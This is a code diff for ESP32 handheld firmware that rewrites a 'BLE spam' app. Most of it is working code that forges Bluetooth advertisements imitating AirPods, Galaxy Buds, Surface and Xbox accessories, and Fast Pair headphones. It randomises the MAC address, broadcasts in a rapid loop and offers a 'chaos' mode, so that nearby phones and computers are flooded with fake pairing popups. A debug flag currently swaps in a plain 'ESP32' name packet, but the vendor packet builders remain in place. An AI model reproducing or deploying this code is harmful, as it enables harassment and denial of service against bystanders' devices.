@@ -1,441 +1,499 @@
 #include "ble_spam.h"
 
 #include <Arduino.h>
+#include <BLEAdvertising.h>
 #include <BLEDevice.h>
-#include <BLEServer.h>
-#include <BLEUtils.h>
 #include <U8g2lib.h>
 #include <WiFi.h>
+#include <esp_bt.h>
 #include <esp_gap_ble_api.h>
 #include <string>
 #include <string.h>
 
 #include "app_config.h"
-#include "bt_remote.h"
-#include "devices.hpp"
-#include "input_manager.h"
 #include "ui_theme.h"
 
 extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
 extern bool runningApp;
 
-#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
-#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P21
-#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
-#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P20
-#else
-#define BLE_SPAM_MAX_TX_POWER ESP_PWR_LVL_P9
-#endif
+#define BTN_UP   AppConfig::BTN_UP
+#define BTN_DOWN AppConfig::BTN_DOWN
+#define BTN_OK   AppConfig::BTN_OK
+#define BTN_BACK AppConfig::BTN_BACK
+#define BTN_AUX  AppConfig::BTN_AUX
 
-enum class BleSpamTarget : uint8_t {
-    None = 0,
-    Apple,
-    Windows
+enum SpamMode {
+    SPAM_APPLE     = 0,
+    SPAM_SAMSUNG   = 1,
+    SPAM_MICROSOFT = 2,
+    SPAM_GOOGLE    = 3,
+    SPAM_CHAOS     = 4
 };
 
-struct AppleProfile {
-    const char* label;
-    int8_t deviceIndex;
-    bool randomDevice;
+static const char* MODE_NAMES[] = {
+    "Apple (iOS popups)",
+    "Samsung (Android)",
+    "Microsoft Swift Pair",
+    "Google Fast Pair",
+    "CHAOS MODE (all)"
+};
+static const int MODE_COUNT = 5;
+
+struct AppleModel {
+    uint8_t product[2];
+    const char* name;
 };
 
-static const AppleProfile APPLE_PROFILES[] = {
-    { "AIRPODS", AIRPODS, false },
-    { "RANDOM", -1, true },
-    { "UPDATE", SOFTWARE_UPDATE, false },
-    { "AIRPODS 2", AIRPODS_GEN_2, false },
-    { "VISION", VISION_PRO, false },
-    { "AIRPODS MAX", AIRPODS_MAX, false },
-    { "ATV SETUP", APPLETV_SETUP, false },
-    { "TRANSFER", TRANSFER_NUMBER, false },
-    { "ATV PAIR", APPLETV_PAIR, false }
+static const AppleModel APPLE_MODELS[] = {
+    {{0x0E, 0x20}, "AirPods Pro"},
+    {{0x0A, 0x20}, "AirPods"},
+    {{0x0B, 0x20}, "AirPods Max"},
+    {{0x05, 0x20}, "AirPods 2nd gen"},
+    {{0x13, 0x20}, "AirPods 3rd gen"},
+    {{0x14, 0x20}, "AirPods Pro 2nd"},
+    {{0x01, 0x20}, "AirPods 1st gen"},
+    {{0x06, 0x20}, "Beats Solo 3"},
+    {{0x09, 0x20}, "BeatsX"},
+    {{0x0C, 0x20}, "Beats Flex"},
+    {{0x11, 0x20}, "Beats Studio Pro"},
+    {{0x16, 0x20}, "Powerbeats Pro"},
+    {{0x17, 0x20}, "Beats Fit Pro"}
+};
+static const int APPLE_COUNT = sizeof(APPLE_MODELS) / sizeof(AppleModel);
+
+struct SamsungModel {
+    uint8_t id[2];
+    const char* name;
 };
 
-static const uint8_t APPLE_PACKET[] = {
-    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
-    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
-    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
+static const SamsungModel SAMSUNG_MODELS[] = {
+    {{0x83, 0xE0}, "Galaxy Buds Live"},
+    {{0x80, 0xE0}, "Galaxy Buds+"},
+    {{0x2C, 0xE1}, "Galaxy Buds 2"},
+    {{0x40, 0xE1}, "Galaxy Buds 2 Pro"},
+    {{0x05, 0xE1}, "Galaxy Buds Pro"},
+    {{0x1F, 0xE0}, "Galaxy Buds"},
+    {{0xA3, 0xE1}, "Galaxy Buds FE"}
+};
+static const int SAMSUNG_COUNT = sizeof(SAMSUNG_MODELS) / sizeof(SamsungModel);
+
+static const char* MS_NAMES[] = {
+    "Surface Keyboard",
+    "Surface Mouse",
+    "Surface Headphones",
+    "Xbox Controller",
+    "Surface Pen"
+};
+static const int MS_COUNT = sizeof(MS_NAMES) / sizeof(char*);
+
+struct GoogleModel {
+    uint8_t id[3];
+    const char* name;
 };
 
-static const uint8_t WINDOWS_PACKET[] = {
-    0x1e, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x01,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+static const GoogleModel GOOGLE_MODELS[] = {
+    {{0xCD, 0x82, 0x56}, "Pixel Buds"},
+    {{0x00, 0x00, 0x47}, "Pixel Buds A"},
+    {{0xF5, 0x2E, 0x41}, "Bose NC 700"},
+    {{0x0E, 0x0B, 0x09}, "JBL Live 650"},
+    {{0x14, 0x00, 0x45}, "Sony WH-1000XM4"},
+    {{0x00, 0x00, 0x44}, "Nest Device"}
 };
+static const int GOOGLE_COUNT = sizeof(GOOGLE_MODELS) / sizeof(GoogleModel);
 
-static const uint8_t TARGET_COUNT = 2;
-static const uint16_t ADV_ON_MS = 100;
+static volatile unsigned long packetsSent = 0;
+static String currentDeviceName = "";
+static SpamMode activeMode = SPAM_APPLE;
+static constexpr bool BLE_SPAM_DIAG_ESP32_ONLY = true;
 
-static BLEServer* bleSpamServer = nullptr;
-static BLEAdvertising* bleSpamAdvertising = nullptr;
-static BleSpamTarget activeTarget = BleSpamTarget::None;
-static BleSpamTarget engineTarget = BleSpamTarget::None;
-static bool bleEngineReady = false;
-static bool burstRunning = false;
-static uint8_t selectedTarget = 0;
-static uint8_t appleProfileIndex = 0;
-static uint8_t animFrame = 0;
-static uint32_t lastFrameMs = 0;
-static uint32_t lastCycleMs = 0;
-static uint32_t burstStartedMs = 0;
-static uint32_t packetCount = 0;
-static char currentPayloadLabel[24] = "READY";
+static bool pressed(uint8_t pin) {
+    return digitalRead(pin) == LOW;
+}
 
-void generatePacket(const AppleDevice& device, uint8_t* buffer, size_t& outLength) {
-    memset(buffer, 0, 31);
+static void waitRelease(uint8_t pin) {
+    while (digitalRead(pin) == LOW) delay(5);
+    delay(80);
+}
 
-    if (device.type == APPLE_AUDIO) {
-        outLength = 31;
-        const uint8_t header[] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07 };
-        const uint8_t body[] = {
-            0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-            0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
-            0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
-        };
+static void beep(uint16_t freq, uint16_t durationMs) {
+    (void)freq;
+    delay(durationMs);
+}
 
-        memcpy(buffer, header, sizeof(header));
-        buffer[7] = device.modelId;
-        memcpy(buffer + 8, body, sizeof(body));
+static String fitOledText(String text, int maxPx) {
+    u8g2.setFont(u8g2_font_5x7_tr);
+    while (text.length() > 0 && u8g2.getStrWidth(text.c_str()) > maxPx) {
+        text.remove(text.length() - 1);
+    }
+    if (text.length() > 2 && u8g2.getStrWidth(text.c_str()) > maxPx - 8) {
+        text.remove(text.length() - 2);
+        text += "..";
+    }
+    return text;
+}
+
+static void drawOledFooter(const char* hint) {
+    u8g2.drawHLine(0, 55, AppConfig::SCREEN_W);
+    u8g2.setFont(u8g2_font_5x7_tr);
+    u8g2.drawStr(2, 63, hint);
+}
+
+static void drawOledRow(int y, bool selected, const String& title) {
+    if (selected) {
+        u8g2.drawBox(0, y - 7, AppConfig::SCREEN_W, 10);
+        u8g2.setDrawColor(0);
+    }
+    u8g2.setFont(u8g2_font_5x7_tr);
+    u8g2.drawStr(3, y, fitOledText(title, 122).c_str());
+    if (selected) u8g2.setDrawColor(1);
+}
+
+static const char* modeShortName(SpamMode mode) {
+    switch (mode) {
+        case SPAM_APPLE:     return "APPLE";
+        case SPAM_SAMSUNG:   return "SAMSUNG";
+        case SPAM_MICROSOFT: return "MS";
+        case SPAM_GOOGLE:    return "GOOGLE";
+        case SPAM_CHAOS:     return "CHAOS";
+        default:             return "BLE";
+    }
+}
+
+static void randomizeMac() {
+    esp_bd_addr_t mac;
+    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
+    mac[0] |= 0xC0;
+    esp_ble_gap_set_rand_addr(mac);
+}
+
+static void sendApplePacket(BLEAdvertising* adv) {
+    int idx = random(0, APPLE_COUNT);
+    const AppleModel& m = APPLE_MODELS[idx];
+    currentDeviceName = String(m.name);
+
+    uint8_t packet[31] = {
+        0x1E, 0xFF,
+        0x4C, 0x00,
+        0x07, 0x19,
+        0x01,
+        m.product[0], m.product[1],
+        0x55
+    };
+    for (int i = 10; i < 31; i++) packet[i] = (uint8_t)random(0, 256);
+
+    BLEAdvertisementData advData;
+    advData.addData(std::string((char*)packet, sizeof(packet)));
+    adv->setAdvertisementData(advData);
+}
+
+static void sendSamsungPacket(BLEAdvertising* adv) {
+    int idx = random(0, SAMSUNG_COUNT);
+    const SamsungModel& m = SAMSUNG_MODELS[idx];
+    currentDeviceName = String(m.name);
+
+    uint8_t packet[27] = {
+        0x1B, 0xFF,
+        0x75, 0x00,
+        0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03,
+        0x21, 0x01, 0x09,
+        m.id[0], m.id[1],
+        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00
+    };
+
+    BLEAdvertisementData advData;
+    advData.addData(std::string((char*)packet, sizeof(packet)));
+    adv->setAdvertisementData(advData);
+}
+
+static void sendMicrosoftPacket(BLEAdvertising* adv) {
+    int idx = random(0, MS_COUNT);
+    currentDeviceName = String(MS_NAMES[idx]);
+
+    uint8_t nameLen = strlen(MS_NAMES[idx]);
+    if (nameLen > 20) nameLen = 20;
+
+    uint8_t packet[31];
+    int p = 0;
+    packet[p++] = 0x03;
+    packet[p++] = 0x03;
+    packet[p++] = 0x2C;
+    packet[p++] = 0xFE;
+    packet[p++] = 0x06 + nameLen;
+    packet[p++] = 0xFF;
+    packet[p++] = 0x06;
+    packet[p++] = 0x00;
+    packet[p++] = 0x03;
+    packet[p++] = 0x00;
+    packet[p++] = 0x80;
+    memcpy(&packet[p], MS_NAMES[idx], nameLen);
+    p += nameLen;
+
+    BLEAdvertisementData advData;
+    advData.addData(std::string((char*)packet, p));
+    adv->setAdvertisementData(advData);
+}
+
+static void sendGooglePacket(BLEAdvertising* adv) {
+    int idx = random(0, GOOGLE_COUNT);
+    const GoogleModel& m = GOOGLE_MODELS[idx];
+    currentDeviceName = String(m.name);
+
+    uint8_t packet[14] = {
+        0x02, 0x01, 0x06,
+        0x03, 0x03, 0x2C, 0xFE,
+        0x06, 0x16, 0x2C, 0xFE,
+        m.id[0], m.id[1], m.id[2]
+    };
+
+    BLEAdvertisementData advData;
+    advData.addData(std::string((char*)packet, sizeof(packet)));
+    adv->setAdvertisementData(advData);
+}
+
+static void sendEsp32NamePacket(BLEAdvertising* adv) {
+    currentDeviceName = "ESP32";
+
+    BLEAdvertisementData advData;
+    advData.setFlags(0x06);
+    advData.setName("ESP32");
+    adv->setAdvertisementData(advData);
+
+    BLEAdvertisementData scanData;
+    scanData.setName("ESP32");
+    adv->setScanResponse(true);
+    adv->setScanResponseData(scanData);
+}
+
+static void sendSpamPacket(BLEAdvertising* adv, SpamMode mode) {
+    if (BLE_SPAM_DIAG_ESP32_ONLY) {
+        sendEsp32NamePacket(adv);
         return;
     }
 
-    outLength = 23;
-    const uint8_t prefix[] = {
-        0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
-        0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1
-    };
-    const uint8_t suffix[] = {
-        0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
-    };
+    SpamMode effective = mode;
+    if (mode == SPAM_CHAOS) {
+        effective = (SpamMode)random(0, 4);
+    }
 
-    memcpy(buffer, prefix, sizeof(prefix));
-    buffer[13] = device.modelId;
-    memcpy(buffer + 14, suffix, sizeof(suffix));
-}
+    randomizeMac();
 
-static void setPayloadLabel(const char* label) {
-    strncpy(currentPayloadLabel, label, sizeof(currentPayloadLabel) - 1);
-    currentPayloadLabel[sizeof(currentPayloadLabel) - 1] = '\0';
-}
-
-static const char* targetName(BleSpamTarget target) {
-    switch (target) {
-        case BleSpamTarget::Apple:   return "APPLE iOS";
-        case BleSpamTarget::Windows: return "WINDOWS";
-        default:                     return "SELECT";
+    switch (effective) {
+        case SPAM_APPLE:     sendApplePacket(adv);     break;
+        case SPAM_SAMSUNG:   sendSamsungPacket(adv);   break;
+        case SPAM_MICROSOFT: sendMicrosoftPacket(adv); break;
+        case SPAM_GOOGLE:    sendGooglePacket(adv);    break;
+        default: break;
     }
 }
 
-static void addRawAdvertisement(BLEAdvertisementData& data, const uint8_t* packet, size_t len) {
-    data.addData(std::string(reinterpret_cast<const char*>(packet), len));
-}
-
-static void fillRandomAddress(esp_bd_addr_t address) {
-    for (uint8_t i = 0; i < 6; i++) {
-        address[i] = random(0, 256);
-        if (i == 0) address[i] |= 0xF0;
-    }
-}
-
-static void applyRandomTxPower() {
-    const int pick = random(100);
-    if (pick < 70) {
-        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, BLE_SPAM_MAX_TX_POWER);
-    } else if (pick < 85) {
-        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(BLE_SPAM_MAX_TX_POWER - 1));
-    } else if (pick < 95) {
-        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(BLE_SPAM_MAX_TX_POWER - 2));
-    } else if (pick < 99) {
-        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(BLE_SPAM_MAX_TX_POWER - 3));
-    } else {
-        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(BLE_SPAM_MAX_TX_POWER - 4));
-    }
-}
-
-static void setRandomAdvertisementType() {
-    const uint8_t choice = random(3);
-    if (choice == 0) {
-        bleSpamAdvertising->setAdvertisementType(ADV_TYPE_IND);
-    } else if (choice == 1) {
-        bleSpamAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
-    } else {
-        bleSpamAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
-    }
-}
-
-static const AppleDevice& currentAppleDevice() {
-    const AppleProfile& profile = APPLE_PROFILES[appleProfileIndex];
-    if (profile.randomDevice) {
-        return ALL_DEVICES[random(0, NUM_DEVICES)];
-    }
-    return ALL_DEVICES[profile.deviceIndex];
-}
-
-static void setAppleAdvertisement(BLEAdvertisementData& data) {
-    setPayloadLabel("AirPods Pro");
-    addRawAdvertisement(data, APPLE_PACKET, sizeof(APPLE_PACKET));
-}
-
-static void setWindowsAdvertisement(BLEAdvertisementData& data) {
-    setPayloadLabel("Microsoft Mouse");
-    addRawAdvertisement(data, WINDOWS_PACKET, sizeof(WINDOWS_PACKET));
-}
-
-static void stopBurst() {
-    if (bleSpamAdvertising != nullptr && burstRunning) {
-        bleSpamAdvertising->stop();
-    }
-    burstRunning = false;
-}
-
-static void ensureBleEngine(BleSpamTarget target) {
-    if (bleEngineReady && bleSpamAdvertising != nullptr && engineTarget == target) return;
-
-    if (bleEngineReady) {
-        stopBurst();
-        BLEDevice::deinit(false);
-        btRemoteMarkBleReleased();
-        delay(120);
-        bleSpamAdvertising = nullptr;
-        bleSpamServer = nullptr;
-        bleEngineReady = false;
-        engineTarget = BleSpamTarget::None;
-    }
-
+static void resetWirelessForBleSpam() {
+    WiFi.disconnect(true, true);
     WiFi.mode(WIFI_OFF);
-    BLEDevice::init(target == BleSpamTarget::Windows ? "Microsoft Mouse" : "AirPods Pro");
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, BLE_SPAM_MAX_TX_POWER);
+    delay(120);
 
-    bleSpamServer = BLEDevice::createServer();
-    bleSpamAdvertising = bleSpamServer->getAdvertising();
-
-    esp_bd_addr_t initialAddress = { 0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69 };
-    bleSpamAdvertising->setDeviceAddress(initialAddress, BLE_ADDR_TYPE_RANDOM);
-    bleEngineReady = true;
-    engineTarget = target;
+    BLEDevice::deinit(true);
+    delay(180);
+    btStop();
+    delay(120);
+    btStart();
+    delay(180);
 }
 
-static void startTarget(BleSpamTarget target) {
-    stopBurst();
-    ensureBleEngine(target);
-    activeTarget = target;
-    packetCount = 0;
-    lastCycleMs = 0;
-    burstStartedMs = 0;
-    setPayloadLabel(target == BleSpamTarget::Apple ? "AirPods Pro" : "Microsoft Mouse");
-}
-
-static void stopTarget() {
-    stopBurst();
-    activeTarget = BleSpamTarget::None;
-    packetCount = 0;
-    lastCycleMs = 0;
-}
-
-static void serviceAdvertisementOnce() {
-    if (activeTarget == BleSpamTarget::None || bleSpamAdvertising == nullptr) return;
-
-    BLEAdvertisementData advertisementData;
-    if (activeTarget == BleSpamTarget::Apple) {
-        setAppleAdvertisement(advertisementData);
-    } else {
-        setWindowsAdvertisement(advertisementData);
-    }
-
-    esp_bd_addr_t address;
-    fillRandomAddress(address);
-    setRandomAdvertisementType();
-    bleSpamAdvertising->setDeviceAddress(address, BLE_ADDR_TYPE_RANDOM);
-    bleSpamAdvertising->setAdvertisementData(advertisementData);
-    bleSpamAdvertising->start();
-
-    burstRunning = true;
-    burstStartedMs = millis();
-    lastCycleMs = burstStartedMs;
-    packetCount++;
-}
-
-static void drawBleGlyph(int x, int y, uint8_t frame) {
-    u8g2.drawLine(x + 12, y + 2, x + 12, y + 28);
-    u8g2.drawLine(x + 12, y + 2, x + 23, y + 10);
-    u8g2.drawLine(x + 23, y + 10, x + 12, y + 17);
-    u8g2.drawLine(x + 12, y + 17, x + 23, y + 24);
-    u8g2.drawLine(x + 23, y + 24, x + 12, y + 28);
-    u8g2.drawLine(x + 4, y + 9, x + 22, y + 23);
-    u8g2.drawLine(x + 4, y + 23, x + 22, y + 9);
-
-    if ((frame % 8) < 4) {
-        u8g2.drawCircle(x + 12, y + 15, 15);
-    }
-}
-
-static void drawMenuRow(int y, const char* label, bool selected) {
-    const int boxX = 46;
-    const int boxW = 76;
-    const int textAreaCenter = boxX + (boxW / 2);
-    const int labelX = textAreaCenter - (u8g2.getStrWidth(label) / 2);
-
-    if (selected) {
-        u8g2.drawBox(boxX, y - 9, boxW, 12);
-        u8g2.setDrawColor(0);
-    }
-
-    u8g2.setFont(u8g2_font_6x10_tr);
-    u8g2.drawStr(labelX, y, label);
-
-    if (selected) {
-        u8g2.setDrawColor(1);
-    }
-}
-
-static void drawTargetMenu() {
+static bool showDisclaimer() {
     u8g2.clearBuffer();
-    UiTheme::drawHeader(u8g2, "BLE SPAM", "TARGET");
-    drawBleGlyph(8, 22, animFrame);
-    drawMenuRow(32, "APPLE iOS", selectedTarget == 0);
-    drawMenuRow(47, "WINDOWS", selectedTarget == 1);
-    UiTheme::drawMiniWave(u8g2, 48, 62, animFrame);
-    u8g2.sendBuffer();
-}
-
-static void drawActiveScreen() {
-    u8g2.clearBuffer();
-    UiTheme::drawHeader(u8g2, "BLE SPAM", "ON");
-    drawBleGlyph(12, 25, animFrame);
-
-    u8g2.setFont(u8g2_font_6x10_tr);
-    u8g2.drawStr(48, 27, targetName(activeTarget));
-
+    UiTheme::drawHeader(u8g2, "BLE SPAM", "AVISO");
     u8g2.setFont(u8g2_font_5x7_tr);
-    char countLine[20];
-    snprintf(countLine, sizeof(countLine), "PKT %lu", (unsigned long)packetCount);
-    u8g2.drawStr(49, 39, currentPayloadLabel);
-    u8g2.drawStr(49, 49, countLine);
+    u8g2.drawStr(4, 24, "Envia adverts BLE");
+    u8g2.drawStr(4, 34, "falsos cercanos.");
+    u8g2.drawStr(4, 45, "Uso responsable.");
+    drawOledFooter("OK acepta  BACK sale");
+    u8g2.sendBuffer();
 
-    for (uint8_t i = 0; i < 8; i++) {
-        int barHeight = 3 + ((animFrame + i * 2) % 14);
-        u8g2.drawBox(47 + i * 9, 63 - barHeight, 5, barHeight);
+    while (true) {
+        if (pressed(BTN_OK)) {
+            beep(2200, 60);
+            waitRelease(BTN_OK);
+            return true;
+        }
+        if (pressed(BTN_BACK)) {
+            beep(1000, 80);
+            waitRelease(BTN_BACK);
+            return false;
+        }
+        delay(20);
+    }
+}
+
+static void drawModeMenu(int cursor) {
+    char status[8];
+    snprintf(status, sizeof(status), "%d/%d", cursor + 1, MODE_COUNT);
+    u8g2.clearBuffer();
+    UiTheme::drawHeader(u8g2, "BLE SPAM", status);
+
+    int first = cursor - 1;
+    if (first < 0) first = 0;
+    if (first > MODE_COUNT - 4) first = max(0, MODE_COUNT - 4);
+
+    for (int i = 0; i < 4; i++) {
+        int idx = first + i;
+        if (idx >= MODE_COUNT) break;
+        drawOledRow(24 + i * 10, idx == cursor, MODE_NAMES[idx]);
     }
 
+    drawOledFooter("OK start  AUX chaos");
     u8g2.sendBuffer();
 }
 
-static void waitForButtonRelease(uint8_t pin) {
-    const uint32_t start = millis();
-    while (digitalRead(pin) == LOW && millis() - start < 600) {
+static int selectMode() {
+    int cursor = 0;
+    drawModeMenu(cursor);
+
+    while (true) {
+        if (pressed(BTN_UP)) {
+            cursor = (cursor - 1 + MODE_COUNT) % MODE_COUNT;
+            beep(2100, 20);
+            drawModeMenu(cursor);
+            delay(180);
+        }
+        if (pressed(BTN_DOWN)) {
+            cursor = (cursor + 1) % MODE_COUNT;
+            beep(2100, 20);
+            drawModeMenu(cursor);
+            delay(180);
+        }
+        if (pressed(BTN_BACK)) {
+            beep(1000, 50);
+            waitRelease(BTN_BACK);
+            return -1;
+        }
+        if (pressed(BTN_AUX)) {
+            beep(1600, 40);
+            waitRelease(BTN_AUX);
+            return SPAM_CHAOS;
+        }
+        if (pressed(BTN_OK)) {
+            beep(1800, 50);
+            waitRelease(BTN_OK);
+            return cursor;
+        }
+        delay(20);
+    }
+}
+
+static void drawAttackFrame(SpamMode mode) {
+    u8g2.clearBuffer();
+    UiTheme::drawHeader(u8g2, "BLE ACTIVE", modeShortName(mode));
+    u8g2.setFont(u8g2_font_5x7_tr);
+    u8g2.drawStr(4, 26, "Packets: 0");
+    u8g2.drawStr(4, 37, "Current: ...");
+    u8g2.drawStr(4, 48, "Rate: -- pkt/s");
+    drawOledFooter("BACK/AUX stop");
+    u8g2.sendBuffer();
+}
+
+static void drawAttackStats(unsigned long pkts, float rate) {
+    u8g2.clearBuffer();
+    UiTheme::drawHeader(u8g2, "BLE ACTIVE", modeShortName(activeMode));
+    u8g2.setFont(u8g2_font_5x7_tr);
+    u8g2.drawStr(4, 25, ("Packets: " + String(pkts)).c_str());
+    u8g2.drawStr(4, 36, fitOledText("Now: " + currentDeviceName, 120).c_str());
+    char rateBuf[22];
+    snprintf(rateBuf, sizeof(rateBuf), "Rate: %d pkt/s", (int)rate);
+    u8g2.drawStr(4, 47, rateBuf);
+    u8g2.drawFrame(90, 50, 34, 5);
+    u8g2.drawBox(92, 52, random(3, 29), 1);
+    drawOledFooter("BACK/AUX stop");
+    u8g2.sendBuffer();
+}
+
+void runBLESpam() {
+    while (digitalRead(BTN_OK) == LOW ||
+           digitalRead(BTN_BACK) == LOW ||
+           digitalRead(BTN_AUX) == LOW) {
         delay(5);
-        yield();
     }
-    Input.resetAll();
-}
+    delay(100);
 
-static bool handleActivePhysicalButtons() {
-    if (digitalRead(AppConfig::BTN_BACK) == LOW) {
-        stopTarget();
-        waitForButtonRelease(AppConfig::BTN_BACK);
-        return false;
-    }
+    if (!showDisclaimer()) return;
 
-    return true;
-}
+    while (true) {
+        int choice = selectMode();
+        if (choice < 0) break;
 
-static void runBlockingAdvertisementLoop() {
-    uint32_t lastUiMs = 0;
+        activeMode = (SpamMode)choice;
 
-    while (runningApp && activeTarget != BleSpamTarget::None) {
-        if (!handleActivePhysicalButtons()) break;
+        resetWirelessForBleSpam();
+        BLEDevice::init(BLE_SPAM_DIAG_ESP32_ONLY ? "ESP32" : "");
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+        BLEServer* server = BLEDevice::createServer();
+        BLEAdvertising* adv = server->getAdvertising();
 
-        serviceAdvertisementOnce();
+        adv->setMinInterval(0x20);
+        adv->setMaxInterval(0x40);
 
-        while (burstRunning && millis() - burstStartedMs < ADV_ON_MS) {
-            if (!handleActivePhysicalButtons()) break;
+        drawAttackFrame(activeMode);
+        beep(2400, 40);
+        delay(20);
+        beep(3000, 60);
+
+        packetsSent = 0;
+        unsigned long lastStatsUpdate = millis();
+        unsigned long lastPacket = 0;
+        unsigned long lastPktCount = 0;
+        float currentRate = 0;
+
+        bool stopAttack = false;
+        while (!stopAttack) {
+            if (millis() - lastPacket > 20) {
+                adv->stop();
+                sendSpamPacket(adv, activeMode);
+                adv->start();
+                packetsSent++;
+                lastPacket = millis();
+            }
+
+            if (millis() - lastStatsUpdate > 250) {
+                unsigned long elapsed = millis() - lastStatsUpdate;
+                unsigned long delta = packetsSent - lastPktCount;
+                currentRate = (delta * 1000.0f) / elapsed;
+                lastPktCount = packetsSent;
+                drawAttackStats(packetsSent, currentRate);
+                lastStatsUpdate = millis();
+            }
+
+            if (pressed(BTN_BACK) || pressed(BTN_AUX)) {
+                stopAttack = true;
+            }
 
             delay(5);
-            yield();
         }
 
-        stopBurst();
-        applyRandomTxPower();
+        adv->stop();
+        BLEDevice::deinit(false);
 
-        if (millis() - lastUiMs >= 120) {
-            lastUiMs = millis();
-            animFrame++;
-            drawActiveScreen();
+        beep(1800, 40);
+        delay(20);
+        beep(1200, 60);
+
+        while (digitalRead(BTN_OK) == LOW ||
+               digitalRead(BTN_BACK) == LOW ||
+               digitalRead(BTN_AUX) == LOW) {
+            delay(5);
         }
-
-        yield();
+        delay(150);
     }
-
-    Input.resetAll();
 }
 
 void bleSpamEnter() {
-    Input.resetAll();
-    BLEDevice::deinit(false);
-    btRemoteMarkBleReleased();
-    delay(120);
-    bleEngineReady = false;
-    bleSpamAdvertising = nullptr;
-    bleSpamServer = nullptr;
-    engineTarget = BleSpamTarget::None;
-    selectedTarget = 0;
-    appleProfileIndex = 0;
-    activeTarget = BleSpamTarget::None;
-    burstRunning = false;
-    animFrame = 0;
-    lastFrameMs = 0;
-    lastCycleMs = 0;
-    packetCount = 0;
-    setPayloadLabel("READY");
+    runBLESpam();
+    runningApp = false;
 }
 
 void bleSpamLoop() {
-    const uint32_t now = millis();
-    if (now - lastFrameMs >= 120) {
-        lastFrameMs = now;
-        animFrame++;
-    }
-
-    if (activeTarget == BleSpamTarget::None) {
-        if (Input.repeating(BTN_ID_UP)) {
-            selectedTarget = selectedTarget == 0 ? TARGET_COUNT - 1 : selectedTarget - 1;
-        }
-        if (Input.repeating(BTN_ID_DOWN)) {
-            selectedTarget = (selectedTarget + 1) % TARGET_COUNT;
-        }
-        if (Input.pressed(BTN_ID_OK)) {
-            startTarget(selectedTarget == 0 ? BleSpamTarget::Apple : BleSpamTarget::Windows);
-            Input.consume(BTN_ID_OK);
-            waitForButtonRelease(AppConfig::BTN_OK);
-            drawActiveScreen();
-            runBlockingAdvertisementLoop();
-            return;
-        }
-        if (Input.pressed(BTN_ID_BACK)) {
-            runningApp = false;
-            Input.consume(BTN_ID_BACK);
-        }
-
-        drawTargetMenu();
-        return;
-    }
-
-    runBlockingAdvertisementLoop();
-    drawActiveScreen();
 }
 
 void bleSpamExit() {
-    stopTarget();
-
-    if (bleEngineReady && !btRemoteBleActive()) {
-        BLEDevice::deinit(false);
-    }
-
-    bleEngineReady = false;
-    bleSpamAdvertising = nullptr;
-    bleSpamServer = nullptr;
-    engineTarget = BleSpamTarget::None;
-    WiFi.mode(WIFI_OFF);
+    BLEDevice::deinit(false);
 }
